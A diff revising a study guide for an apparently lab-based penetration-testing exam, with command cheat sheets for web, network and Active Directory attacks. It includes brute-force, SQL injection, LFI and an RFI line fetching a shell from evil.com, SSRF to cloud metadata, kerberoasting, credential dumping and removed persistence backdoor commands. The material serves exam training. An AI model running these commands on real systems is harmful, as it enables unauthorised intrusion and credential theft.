@@ -1,485 +1,436 @@
-Exam Step-by-Step Guide
+# Exam Guide
 
----
+## Exam Overview
 
-## 1. Reconnaissance & Enumeration
+### Format and Logistics
+- **Duration**: 48 hours
+- **Passing Score**: 750/1000 points
+- **Free Retake**: Available
+- **Documentation**: All commands must save outputs to files
 
-**Goal:** Find as much info as possible about your target before touching it directly.
+### Components and Scoring
 
-### Passive Recon (No interaction with target)
-- **theHarvester**: Gathers emails, subdomains, hosts from public sources.
+#### 1. AppSec (40% of exam)
+- Find and exploit 4 vulnerabilities
+- Capture 4 flags
+- Focus on OWASP Top 10 and Web Fundamentals
+- All outputs must be saved to files
+
+#### 2. NetSec (30% of exam)
+- Compromise 2 hosts:
+  - 1 Windows machine
+  - 1 Linux machine
+- Perform privilege escalation
+- Escalate to root/admin
+- All outputs must be saved to files
+
+#### 3. Active Directory (30% of exam)
+- Breach the AD server
+- Enumerate the environment
+- Escalate to domain controller
+- All outputs must be saved to files
+
+### Required Paths
+
+#### Junior Penetration Tester Path
+1. Passive Reconnaissance
+2. Active Reconnaissance
+3. Nmap Live Host Discovery
+4. Nmap Basic Port Scans
+5. Nmap Advanced Port Scans
+6. Nmap Port Scans
+7. Protocols and Servers
+8. Vulnerabilities 101
+9. Exploit Vulnerabilities
+10. Vulnerabilities Capstone
+11. Metasploit Introduction
+12. Metasploit Exploitation
+13. Metasploit Meterpreter
+14. Linux Privilege Escalation
+15. Windows Privilege Escalation
+
+#### Web Fundamentals Path
+1. Subdomain Enumeration
+2. Authentication Bypass
+3. IDOR
+4. File Inclusion
+5. SSRF
+6. XSS (Cross-site Scripting)
+7. Command Injection
+8. SQL Injection
+9. Burp Suite
+10. OWASP API Security
+
+### Practice Rooms
+Essential rooms to complete:
+- Blue
+- Net Sec Challenge
+- Pickle Rick
+- Reset
+- Ledger
+- Billing
+- Rabbit Store
+- K2
+- Stealth
+- Silver Platter
+- Lookback
+- AVenger
+
+## Tips & Tricks
+
+### General Tips
+1. **Always Save Outputs**
+   - Use `tee` for all commands
+   - Create organized directories for each component
+   - Example: `mkdir -p appsec/netsec/ad && cd appsec`
+
+2. **Time Management**
+   - AppSec: ~20 hours
+   - NetSec: ~14 hours
+   - AD and reporting: ~10 hours
+   - Leave 4 hours buffer for unexpected issues
+
+3. **Documentation Strategy**
+   - Take screenshots of all findings
+   - Save all command outputs
+   - Document steps in real-time
+   - Use the provided report template
+
+### Component-Specific Tips
+
+#### AppSec Tips
+1. Start with subdomain enumeration
+2. Use automated tools first (sqlmap, dalfox)
+3. Test for low-hanging fruit (XSS, SQLi)
+4. Save all Burp Suite requests/responses
+5. Document all parameters tested
+
+#### NetSec Tips
+1. Begin with full port scans
+2. Document all open services
+3. Try default credentials first
+4. Use linpeas/winpeas for privilege escalation
+5. Save all exploit attempts
+
+#### AD Tips
+1. Start with basic enumeration
+2. Use BloodHound for mapping
+3. Focus on kerberoasting
+4. Document all user/group findings
+5. Save all credential dumps
+
+### Command Output Strategy
 ```bash
-theHarvester -d target.com -b all -f theharvester-output.txt
-```
-*What to look for:* Emails, subdomains, hosts.  
-*What to do next:* Use found subdomains/hosts for further scanning. Use emails for phishing (if in scope) or OSINT.
+# Create directory structure
+mkdir -p exam/{appsec,netsec,ad}/{recon,exploit,post}
 
-- **whois**: Shows who owns the domain, DNS servers, etc.
+# Example command with output saving
+nmap -sC -sV -A -T4 target | tee exam/netsec/recon/nmap_scan.txt
+
+# Save screenshots
+gnome-screenshot -f exam/appsec/screenshots/xss_vulnerability.png
+
+# Save Burp Suite data
+# File > Save Project > exam/appsec/burp/project.burp
+```
+
+### Practice Strategy
+1. Complete all paths in order
+2. Practice in recommended rooms
+3. Time yourself during practice
+4. Use the same output saving strategy
+5. Write practice reports
+
+## Table of Contents
+- [Preparation Checklist](#preparation-checklist)
+- [1. AppSec: Web Application Testing](#1-appsec-web-application-testing)
+- [2. NetSec: Compromise Linux and Windows Hosts](#2-netsec-compromise-linux-and-windows-hosts)
+- [3. Active Directory: Breach and Escalate](#3-active-directory-breach-and-escalate)
+- [4. Reporting](#4-reporting)
+- [Quick Reference Cheatsheet](#quick-reference-cheatsheet)
+- [Exam Day Strategy](#exam-day-strategy)
+- [Additional Resources](#additional-resources)
+
+## Preparation Checklist
+
+### Tools Installation
+Install the following tools on Kali Linux:
+
+#### Reconnaissance
 ```bash
-whois target.com > whois-output.txt
+sudo apt install nmap rustscan theharvester whois dnsenum fierce massdns
 ```
-*What to look for:* Registrant info, DNS servers, important dates.  
-*What to do next:* Use DNS servers for zone transfer attempts. Use registrant info for OSINT.
 
-- **crt.sh**: Search for SSL certificates and subdomains.
-  - Visit: https://crt.sh/?q=target.com
-*What to look for:* Subdomains, alternative names.  
-*What to do next:* Add subdomains to your scan list.
-
-- **Shodan/Censys**: Find exposed services/devices.
-  - Visit: https://www.shodan.io/search?query=target.com
-*What to look for:* Open ports, exposed services, banners.  
-*What to do next:* Target interesting services in active recon.
-
-### Active Recon (Directly interacts with target)
-- **nmap**: Finds open ports, services, versions, and OS.
+#### Web Testing
 ```bash
-nmap -sC -sV -A -T4 target.com -oN nmap-output.txt
-nmap -p- target.com -oN nmap-full-output.txt  # Scan all ports
-nmap --script vuln target.com -oN nmap-vuln-output.txt  # Vulnerability scan
+sudo apt install sqlmap dalfox xsstrike ffuf gobuster nikto wpscan dirsearch paramspider arjun nuclei sslscan
 ```
-*What to look for:* Open ports, service versions, OS details, vulnerabilities.  
-*What to do next:* For web ports (80/443), move to web testing. For SMB/FTP/SSH, move to network testing. For high/unknown ports, research the service.
 
-- **rustscan**: Fast port scan.
+#### Network Testing
 ```bash
-rustscan -a target.com -- -sV -O | tee rustscan-output.txt
+sudo apt install hydra medusa crackmapexec enum4linux smbclient snmpwalk xfreerdp tcpdump wireshark mitmproxy
 ```
-*What to look for:* Open ports.  
-*What to do next:* Use results to focus nmap scans or other enumeration.
 
-- **masscan**: Super fast port scanner.
+#### Active Directory
 ```bash
-masscan -p1-65535 target.com --rate=10000 -oG masscan-output.txt
+# Install BloodHound and Neo4j
+sudo apt install bloodhound neo4j
 ```
-*What to look for:* Open ports.  
-*What to do next:* Use results to guide nmap or service-specific scans.
 
-- **dig/nslookup/host**: DNS queries.
+#### Post-Exploitation
 ```bash
-dig target.com > dig-output.txt
-nslookup target.com > nslookup-output.txt
-host target.com > host-output.txt
+sudo apt install metasploit-framework
 ```
-*What to look for:* IP addresses, DNS records, subdomains.  
-*What to do next:* Add found hosts to your scan list.
 
-- **Subdomain Enumeration**
+### Wordlists
+- Use seclists and rockyou.txt (`/usr/share/wordlists/`)
+
+### Setup
+1. Configure Burp Suite proxy with browser
+2. Set up BloodHound and Neo4j for AD
+3. Test tools in TryHackMe rooms:
+   - Blue
+   - Pickle Rick
+   - Reset
+   - Ledger
+   - Billing
+   - Rabbit Store
+   - K2
+   - Stealth
+   - Silver Platter
+   - Lookback
+   - AVenger
+
+## 1. AppSec: Web Application Testing
+
+### Overview
+- 4 Vulnerabilities to identify and exploit
+- 4 Flags to capture
+- 40% of exam score
+- Focus on OWASP Top 10 and Web Fundamentals
+
+### Key Tools
 ```bash
-dnsenum target.com > dnsenum-output.txt
-subfinder -d target.com -o subfinder-output.txt
-amass enum -d target.com -o amass-output.txt
-assetfinder --subs-only target.com > assetfinder-output.txt
+sqlmap dalfox xsstrike ffuf gobuster nikto wpscan burpsuite dirsearch paramspider arjun nuclei sslscan waybackurls gau katana gowitness
 ```
-*What to look for:* New subdomains, alternate hosts.  
-*What to do next:* Scan new subdomains for open ports and services.
 
-- **Zone Transfer**
+### Testing Areas
+1. [Subdomain Enumeration](#subdomain-enumeration)
+2. [Authentication Bypass](#authentication-bypass)
+3. [IDOR](#idor)
+4. [File Inclusion](#file-inclusion)
+5. [SSRF](#ssrf)
+6. [XSS](#xss)
+7. [Command Injection](#command-injection)
+8. [SQL Injection](#sql-injection)
+9. [Burp Suite](#burp-suite)
+10. [OWASP API Security](#owasp-api-security)
+
+### Subdomain Enumeration
 ```bash
-dig axfr @ns1.target.com target.com > dig-axfr-output.txt
+# Enumerate subdomains
+dnsenum target.com | tee dnsenum_subdomains.txt
+fierce --domain target.com | tee fierce_subdomains.txt
+massdns -r resolvers.txt -t A target.com -o S | tee massdns_subdomains.txt
+theHarvester -d target.com -b all | tee theharvester_subdomains.txt
+subfinder -d target.com -o subfinder_subdomains.txt
+amass enum -d target.com -o amass_subdomains.txt
 ```
-*What to look for:* Full DNS zone data (all subdomains/hosts).  
-*What to do next:* Add all found hosts to your scan and attack list.
 
-- **Banner Grabbing**
+### Authentication Bypass
 ```bash
-nc -nv target.com 80 > nc-banner-output.txt
-telnet target.com 80 | tee telnet-banner-output.txt
+# Brute-force login
+hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "http://target/login:username=^USER^&password=^PASS^:F=invalid" -o hydra_login.txt
+
+# Test weak credentials
+curl -d "username=admin&password=admin" -X POST http://target/login | tee auth_test.txt
+
+# Check cookie-based bypass
+curl -b "session=admin" http://target/dashboard | tee cookie_bypass.txt
 ```
-*What to look for:* Service banners, version info, custom messages.  
-*What to do next:* Use version info for vulnerability research or targeted exploits.
 
-**What to do next:**
-- Save all outputs to files (e.g., `nmap -oN nmap.txt`).
-- If you see web ports, move to web testing. If you see SMB/FTP/SSH, move to network testing.
-
-**Exam Tips:**
-- Always save your output.
-- If stuck, move on and come back later.
-
----
-
-## 2. Web Application Testing
-
-**Goal:** Find vulnerabilities in web apps (directories, files, SQLi, XSS, etc.).
-
-- **Directory Brute-Forcing**
+### IDOR
 ```bash
-ffuf -w /usr/share/wordlists/dirb/common.txt -u http://target.com/FUZZ -o ffuf-output.txt
-ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://target.com/FUZZ -o ffuf-large-dirs-output.txt
-ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u http://target.com/FUZZ -o ffuf-large-files-output.txt
+# Test IDOR by changing IDs
+curl -v "http://target/profile?id=1" | tee idor_user1.txt
+curl -v "http://target/profile?id=2" | tee idor_user2.txt
 
-gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -o gobuster-output.txt
-
-# Login Brute-Forcing (POST)
-ffuf -w /usr/share/wordlists/usernames.txt:USER -w /usr/share/wordlists/passwords.txt:PASS -u http://target.com/login -X POST -d 'username=USER&password=PASS' -H 'Content-Type: application/x-www-form-urlencoded' -o ffuf-login-output.txt
-
-# VHost Fuzzing
-ffuf -w /usr/share/wordlists/vhosts.txt -u http://target.com -H 'Host: FUZZ.target.com' -o ffuf-vhost-output.txt
-
-# Parameter Fuzzing
-ffuf -w /usr/share/wordlists/params.txt -u 'http://target.com/page?FUZZ=test' -o ffuf-param-output.txt
-
-# Header Fuzzing
-ffuf -w /usr/share/wordlists/headers.txt -u http://target.com -H 'FUZZ: test' -o ffuf-header-output.txt
+# Brute-force IDs
+ffuf -w /usr/share/wordlists/seclists/Miscellaneous/ids.txt -u "http://target/profile?id=FUZZ" -o ffuf_idor.json | tee ffuf_idor.txt
 ```
-*What to look for:* 200/403/401 status codes, interesting directories/files, valid logins, vhosts, parameters, or headers.  
-*What to do next:* Visit found URLs, try to access restricted areas, test for vulnerabilities, or escalate access.
 
-- **Parameter Discovery**
+### File Inclusion
 ```bash
-arjun -u http://target.com/page -oT arjun-output.txt
-paramspider -d target.com | tee paramspider-output.txt
-```
-*What to look for:* Parameters in URLs (e.g., ?id=, ?user=).  
-*What to do next:* Test discovered parameters for SQLi, XSS, LFI, etc.
+# Test LFI
+curl -v "http://target/page?page=../../../../etc/passwd" | tee lfi_passwd.txt
+curl -v "http://target/page?page=php://filter/convert.base64-encode/resource=index.php" | tee lfi_filter.txt
 
-- **SQL Injection**
+# Test RFI
+curl -v "http://target/page?page=http://evil.com/shell.txt" | tee rfi_shell.txt
+```
+
+### SSRF
 ```bash
-sqlmap -u "http://target.com/page?id=1" --dbs -o --batch --output-dir=sqlmap-output
-sqlmap -r request.txt --batch --risk=3 --level=5 -o --output-dir=sqlmap-advanced-output
-```
-*What to look for:* Database names, tables, extracted data.  
-*What to do next:* Dump tables, look for credentials, escalate access.
+# Test SSRF to localhost
+curl -v "http://target/page?url=http://localhost" | tee ssrf_localhost.txt
 
-- **XSS Testing**
+# Test SSRF to cloud metadata
+curl -v "http://target/page?url=http://169.254.169.254/latest/meta-data/" | tee ssrf_aws.txt
+```
+
+### XSS
 ```bash
-dalfox url http://target.com -o dalfox-output.txt
-xsstrike -u http://target.com | tee xsstrike-output.txt
-```
-*What to look for:* Reflected input, alert popups, script execution.  
-*What to do next:* Try to steal cookies, escalate privileges, or bypass controls.
+# Test XSS with automated tools
+dalfox url http://target | tee dalfox_xss.txt
+xsstrike -u http://target | tee xsstrike_xss.txt
 
-- **Cookie Tampering**
+# Manual XSS testing
+curl -v "http://target/page?search=<script>alert(1)</script>" | tee xss_basic.txt
+```
+
+### Command Injection
 ```bash
-curl http://domain.com/cookie-test
-curl https://domain.com/cookie-test
-
-curl -H "Cookie: logged_in=true; admin=false" http://domain.com/cookie-test
-curl -H "Cookie: logged_in=true; admin=false" https://domain.com/cookie-test
-
-curl -H "Cookie: logged_in=true; admin=true" http://domain.com/cookie-test
-curl -H "Cookie: logged_in=true; admin=true" https://domain.com/cookie-test
+# Test command injection
+curl -v "http://target/page?cmd=;id" | tee cmd_injection_id.txt
+curl -v "http://target/page?cmd=&&whoami" | tee cmd_injection_whoami.txt
 ```
-*What to look for:* Changes in access, privilege escalation, or bypassed restrictions.  
-*What to do next:* Try to access admin-only features, escalate privileges, or bypass authentication.
 
-- **Vulnerability Scanning**
+### SQL Injection
 ```bash
-nikto -h http://target.com -o nikto-output.txt
-wpscan --url http://target.com --enumerate u,p -o wpscan-output.txt
-nuclei -u http://target.com -o nuclei-output.txt
+# Test SQL injection
+sqlmap -u "http://target/page?id=1" --dbs --output-dir=sqlmap_output | tee sqlmap_summary.txt
+sqlmap -u "http://target/login" --data="username=admin&password=*" --technique=B --output-dir=sqlmap_login | tee sqlmap_login.txt
 ```
-*What to look for:* Vulnerabilities, outdated software, weak plugins, user accounts.  
-*What to do next:* Exploit found vulnerabilities or weak points.
 
-- **Web Crawling**
+## 2. NetSec: Compromise Linux and Windows Hosts
+
+### Reconnaissance
 ```bash
-gospider -s http://target.com -o gospider-output.txt
-hakrawler -url http://target.com | tee hakrawler-output.txt
+# Port scanning
+nmap -sC -sV -A -T4 target -oN nmap_scan.txt
+rustscan -a target -- -sV -O | tee rustscan_output.txt
+
+# Banner grabbing
+nc -nv target 80 | tee banner_http.txt
+telnet target 80 | tee telnet_http.txt
 ```
-*What to look for:* Hidden endpoints, JS files, API routes.  
-*What to do next:* Add new endpoints to your testing list.
 
-- **File Upload Bypass**
-  - Try uploading `.php`, `.php.jpg`, `.phtml`, or use Burp to change Content-Type.
-*What to look for:* Successful upload, file execution, bypassed restrictions.  
-*What to do next:* Try to get code execution or a shell.
-
-- **Disable JavaScript** in browser dev tools to bypass client-side validation.
-*What to look for:* Ability to submit forms or upload files without client-side checks.  
-*What to do next:* Try to bypass restrictions and upload malicious files.
-
-**What to do next:**
-- Visit found URLs in browser.
-- Try default creds or brute force login.
-- Test file uploads.
-
-**Exam Tips:**
-- Try all HTTP methods (GET, POST, PUT, DELETE, etc.).
-- Look for hidden fields, parameter pollution, and bypasses.
-
----
-
-## 3. Network Penetration Testing
-
-**Goal:** Attack network services (SMB, FTP, SNMP, RDP, SSH, etc.).
-
-- **SMB Enumeration**
+### Service Enumeration
 ```bash
-enum4linux -a target.com | tee enum4linux-output.txt
-smbclient -L //target.com/ | tee smbclient-output.txt
-crackmapexec smb target.com -u user -p /usr/share/wordlists/rockyou.txt | tee crackmapexec-output.txt
-```
-*What to look for:* Shares, users, permissions, anonymous access.  
-*What to do next:* Try to access shares, enumerate users, attempt password attacks.
+# SMB
+enum4linux -a target | tee enum4linux_output.txt
+smbclient -L //target/ | tee smb_shares.txt
 
-- **FTP Brute Force**
+# FTP
+nmap -p 21 --script ftp-anon,ftp-brute target -oN ftp_nmap.txt
+
+# SSH
+nmap -p 22 --script ssh-auth-methods,ssh-brute target -oN ssh_nmap.txt
+```
+
+### Exploitation
 ```bash
-hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://target.com -o hydra-ftp-output.txt
-medusa -u user -P /usr/share/wordlists/rockyou.txt -h target.com -M ftp | tee medusa-ftp-output.txt
+# Brute-force
+hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://target -o hydra_ssh.txt
+crackmapexec smb target -u user -p /usr/share/wordlists/rockyou.txt | tee cme_smb_brute.txt
 ```
-*What to look for:* Valid credentials, successful logins.  
-*What to do next:* Log in to FTP, look for sensitive files, upload a webshell if possible.
 
-- **SSH Brute Force**
+### Privilege Escalation
 ```bash
-hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://target.com -o hydra-ssh-output.txt
-medusa -u user -P /usr/share/wordlists/rockyou.txt -h target.com -M ssh | tee medusa-ssh-output.txt
-```
-*What to look for:* Valid credentials, successful logins.  
-*What to do next:* Log in to SSH, enumerate the system, escalate privileges.
+# Linux
+./linpeas.sh | tee linpeas_output.txt
+find / -perm -4000 2>/dev/null | tee suid_bins.txt
 
-- **SNMP Enumeration**
+# Windows
+winPEAS.exe | tee winpeas_output.txt
+whoami /priv | tee user_privs.txt
+```
+
+## 3. Active Directory: Breach and Escalate
+
+### Enumeration
 ```bash
-snmpwalk -v2c -c public target.com > snmpwalk-output.txt
-```
-*What to look for:* System info, user accounts, network config.  
-*What to do next:* Use info for further attacks or lateral movement.
+# Basic enumeration
+net user /domain | tee ad_users.txt
+net group "Domain Admins" /domain | tee ad_domain_admins.txt
 
-- **RDP Brute Force**
+# BloodHound
+SharpHound.exe -c all --zipfilename bloodhound_data.zip
+```
+
+### Exploitation
 ```bash
-hydra -t 4 -V -f -l user -P /usr/share/wordlists/rockyou.txt rdp://target.com -o hydra-rdp-output.txt
-xfreerdp /u:user /p:pass /v:target.com | tee xfreerdp-output.txt
+# Kerberoasting
+GetUserSPNs.py domain/user:pass -dc-ip x.x.x.x -outputfile kerberoast_hashes.txt
+
+# AS-REP Roasting
+GetNPUsers.py domain/ -usersfile users.txt -no-pass -outputfile asrep_hashes.txt
 ```
-*What to look for:* Valid credentials, successful logins.  
-*What to do next:* Log in to RDP, enumerate the system, escalate privileges.
 
-- **Traffic Sniffing**
-```bash
-tcpdump -i eth0 -w capture.pcap
-wireshark # Save the capture from the GUI as needed
-mitmproxy -m transparent | tee mitmproxy-output.txt
+## 4. Reporting
+
+### Template
+```markdown
+# Vulnerability Report
+
+## Title
+[Vulnerability Name]
+
+## Description
+[Impact and details]
+
+## Steps to Reproduce
+1. [Step 1]
+2. [Step 2]
+3. [Step 3]
+
+## Evidence
+- [Screenshots]
+- [Command outputs]
+
+## Mitigation
+[Recommended fixes]
 ```
-*What to look for:* Credentials, session tokens, sensitive data in traffic.  
-*What to do next:* Use captured data for further attacks or credential reuse.
 
-**What to do next:**
-- If you get credentials, try them everywhere.
-- Analyze captured traffic for creds or sensitive data.
+## Quick Reference Cheatsheet
 
-**Exam Tips:**
-- Don't waste time brute-forcing if it's not working.
-- Check for low-hanging fruit first (default creds, public shares, etc.).
+| Component | Command | Purpose |
+|-----------|---------|---------|
+| AppSec | `dnsenum target.com` | Subdomain enumeration |
+| AppSec | `sqlmap -u "http://target/page?id=1"` | SQL injection |
+| AppSec | `dalfox url http://target` | XSS testing |
+| NetSec | `nmap -sC -sV -A -T4 target` | Port scanning |
+| NetSec | `hydra -l user -P rockyou.txt ssh://target` | Brute-forcing |
+| AD | `SharpHound.exe -c all` | BloodHound collection |
 
----
+## Exam Day Strategy
 
-## 4. Active Directory Exploitation
+### Time Management
+- AppSec: ~20 hours
+- NetSec: ~14 hours
+- AD and reporting: ~10 hours
 
-**Goal:** Enumerate and attack AD environments (BloodHound, kerberoasting, AS-REP roasting, etc.).
+### Workflow
+1. Start with AppSec
+2. Move to NetSec
+3. Tackle AD
+4. Document continuously
 
-- **BloodHound Collection**
-```bash
-neo4j console & bloodhound &  # Start services
-SharpHound.exe -c all > sharphound-output.txt  # Collect data on Windows
-```
-*What to look for:* User/computer relationships, attack paths, high-privilege users.  
-*What to do next:* Identify attack paths, target privileged accounts for escalation.
+### Tips
+- Save outputs with `tee` for real-time review
+- Use checklists to track progress
+- Practice in TryHackMe rooms
 
-- **Kerberoasting**
-```bash
-GetUserSPNs.py domain/user:pass -dc-ip x.x.x.x > getuserspns-output.txt
-```
-*What to look for:* Service account hashes.  
-*What to do next:* Crack hashes with hashcat/john, try resulting passwords.
+## Additional Resources
 
-- **AS-REP Roasting**
-```bash
-GetNPUsers.py domain/ -usersfile users.txt -no-pass > getnpusers-output.txt
-```
-*What to look for:* Hashes for users without pre-auth.  
-*What to do next:* Crack hashes, try resulting passwords.
-
-- **Windows Enumeration**
-```bash
-net user /domain > netuser-output.txt
-net group "Domain Admins" /domain > netgroup-output.txt
-dsquery * -limit 100 > dsquery-output.txt
-```
-*What to look for:* Usernames, group memberships, admin accounts.  
-*What to do next:* Target admins for attacks, try password reuse.
-
-- **Lateral Movement**
-```bash
-PsExec.exe \\target.com -u user -p pass cmd > psexec-output.txt
-wmiexec.py domain/user:pass@target.com > wmiexec-output.txt
-```
-*What to look for:* Successful remote command execution.  
-*What to do next:* Use new access to escalate privileges or dump more credentials.
-
-**What to do next:**
-- Crack dumped hashes (see next section).
-- Use found creds for lateral movement.
-
-**Exam Tips:**
-- Document all users, groups, and shares you find.
-- Try all credentials everywhere.
-
----
-
-## 5. Exploitation & Post-Exploitation
-
-**Goal:** Get a shell and escalate privileges to root/Administrator. Dump credentials, establish persistence, and recon again.
-
-- **Linux Privilege Escalation**
-```bash
-./linpeas.sh > linpeas-output.txt
-find / -perm -4000 2>/dev/null > suid-output.txt
-crontab -l > crontab-output.txt
-```
-*What to look for:* SUID binaries, cron jobs, kernel exploits, misconfigurations.  
-*What to do next:* Try privilege escalation exploits, check for writable SUID files or cron jobs.
-
-- **Windows Privilege Escalation**
-```bash
-winPEAS.exe > winpeas-output.txt
-```
-*What to look for:* Misconfigurations, vulnerable services, credentials.  
-*What to do next:* Use findings to escalate privileges.
-
-- **Credential Dumping**
-```bash
-mimikatz > mimikatz-output.txt
-secretsdump.py -just-dc-user domain/user:pass@dc-ip > secretsdump-output.txt
-samdump2 > samdump2-output.txt
-cat /etc/shadow > shadow-output.txt
-```
-*What to look for:* Password hashes, cleartext credentials.  
-*What to do next:* Crack hashes, use credentials for lateral movement or privilege escalation.
-
-- **Persistence**
-```bash
-echo "* * * * * root /tmp/rev.sh" >> /etc/crontab
-reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\path\to\backdoor.exe"
-```
-*What to look for:* Ability to maintain access after reboot.  
-*What to do next:* Set up persistence only if allowed by exam rules.
-
-- **Host Recon**
-```bash
-whoami > whoami-output.txt
-hostname > hostname-output.txt
-ipconfig /all > ipconfig-output.txt
-ifconfig > ifconfig-output.txt
-ps aux > ps-output.txt
-tasklist > tasklist-output.txt
-netstat -ano > netstat-output.txt
-```
-*What to look for:* User context, running processes, network connections.  
-*What to do next:* Identify interesting processes, connections, or users for further exploitation.
-
-### Password Cracking Tools
-
-#### Hydra
-Hydra is a fast and flexible login cracker supporting numerous protocols.
-
-**Common Usage Examples:**
-```bash
-# SSH Brute Force
-hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://target.com -o hydra-ssh-output.txt
-# FTP Brute Force
-hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://target.com -o hydra-ftp-output.txt
-# HTTP Basic Auth
-hydra -l admin -P passwords.txt http-get://target.com/login -o hydra-http-output.txt
-# RDP Brute Force
-hydra -t 4 -V -f -l user -P /usr/share/wordlists/rockyou.txt rdp://target.com -o hydra-rdp-output.txt
-# SMB Brute Force
-hydra -l user -P /usr/share/wordlists/rockyou.txt smb://target.com -o hydra-smb-output.txt
-# MySQL Brute Force
-hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://target.com -o hydra-mysql-output.txt
-```
-*What to look for:* Successful logins, valid credentials.  
-*What to do next:* Use credentials to access services, escalate privileges, or pivot.
-
-#### Hashcat
-Hashcat is a powerful password recovery tool for cracking hashes.
-
-**Common Usage Examples:**
-```bash
-# Crack an MD5 hash
-hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -o hashcat-md5-cracked.txt
-# Crack a SHA1 hash
-hashcat -m 100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -o hashcat-sha1-cracked.txt
-# Crack a NTLM hash
-hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -o hashcat-ntlm-cracked.txt
-# Crack a bcrypt hash
-hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -o hashcat-bcrypt-cracked.txt
-# Crack a ZIP file hash
-hashcat -m 13600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -o hashcat-zip-cracked.txt
-# Crack with rules
-hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule -o hashcat-md5-rules-cracked.txt
-```
-*What to look for:* Cracked passwords in output file.  
-*What to do next:* Use passwords for escalation, lateral movement, or reporting.
-
-#### John the Ripper
-John the Ripper is a fast password cracker, primarily for Unix-based systems.
-
-**Common Usage Examples:**
-```bash
-# Basic usage
-john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --pot=john-pot.txt
-# Crack a shadow file
-unshadow /etc/passwd /etc/shadow > unshadowed.txt
-john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt --pot=john-pot.txt
-# Crack a ZIP file
-zip2john secret.zip > zip.hash
-john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash --pot=john-pot.txt
-# Crack a Windows NTLM hash
-john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt ntlm_hash.txt --pot=john-pot.txt
-# Show cracked passwords
-john --show hash.txt --pot=john-pot.txt > john-show-output.txt
-```
-*What to look for:* Cracked passwords in output or pot file.  
-*What to do next:* Use passwords for escalation, lateral movement, or reporting.
-
-**What to do next:**
-- Use cracked passwords to escalate or pivot.
-- Try all found credentials everywhere.
-
-**Exam Tips:**
-- Document every credential and hash you find.
-- Try multiple tools if one doesn't work.
-
----
-
-## 6. Reporting & Time Management
-
-**Goal:** Show what you found, how you found it, and how to fix it. Manage your time and notes for the exam.
-
-- **Take screenshots** of every step (e.g., `gnome-screenshot`, `scrot`).
-- **Write down**:
-  - What you did
-  - What you found
-  - How to reproduce
-  - How to fix
-- **Prepare a report** with:
-  - Vulnerability title
-  - Impact/description
-  - Steps to reproduce
-  - Evidence (screenshots, output)
-  - Mitigation
-
-**Time Management Tips:**
-- Triage: Identify high-value targets first
-- Timebox: Don't get stuck—move on and return later
-- Document as you go
-
----
-
-## Exam Day Checklist
-
-- [ ] Enumerate all hosts and services (nmap, rustscan, masscan)
-- [ ] Perform passive recon (whois, theHarvester, crt.sh)
-- [ ] Enumerate DNS, subdomains, and try zone transfer
-- [ ] Web: Test for OWASP Top 10, file upload, bypasses
-- [ ] Network: Enumerate SMB, FTP, SNMP, RDP, SSH
-- [ ] Attempt password attacks where applicable
-- [ ] AD: Run BloodHound, try kerberoasting, AS-REP roasting
-- [ ] After initial access: enumerate for privilege escalation
-- [ ] Dump credentials, look for persistence opportunities
-- [ ] Take notes/screenshots for every step
-- [ ] Prepare clear, concise report with evidence
-- [ ] Manage time—move on if stuck, revisit later
+- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
+- [SecLists GitHub](https://github.com/danielmiessler/SecLists)
+- [LinPEAS GitHub](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
+- TryHackMe Rooms:
+  - Blue
+  - Pickle Rick
+  - Net Sec Challenge
+  - Ledger
+  - Billing
 
 ---
